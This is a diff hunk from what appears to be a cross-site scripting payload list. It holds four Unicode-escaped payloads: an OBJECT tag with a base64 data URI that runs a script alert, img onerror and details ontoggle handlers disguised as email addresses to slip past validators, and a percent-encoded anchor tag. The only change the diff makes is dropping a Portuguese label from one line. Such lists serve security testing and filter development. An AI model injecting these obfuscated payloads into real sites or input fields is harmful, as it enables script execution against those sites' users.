@@ -1,4 +1,4 @@
-String em Unicode: \u003cOBJECT data\u003ddata\u003atext\u002fhtml\u003bbase64\u002cPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4\u003e
+\u003cOBJECT data\u003ddata\u003atext\u002fhtml\u003bbase64\u002cPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4\u003e
 \u0022\u003cimg\u002fsrc\u002fonerror\u003dalert\u00280\u0029\u0022\u0040xss\u002ecom
 \u0022mitsec\u003cform\u002f\u003e\u003c\u0021\u003e\u003cdetails\u002fopen\u002fontoggle\u003dalert\u0028document\u002edomain\u0029\u003e\u0022\u0040gmail\u002ecom
 \u0026lt\u003bA HREF\u003d\u0026quot\u003bhttp\u003a\u002f\u002f\u002577\u002577\u002577\u00252E\u002567\u00256F\u00256F\u002567\u00256C\u002565\u00252E\u002563\u00256F\u00256D\u0026quot\u003b\u0026gt\u003bXSS\u0026lt\u003b\u002fA\u0026gt\u003b
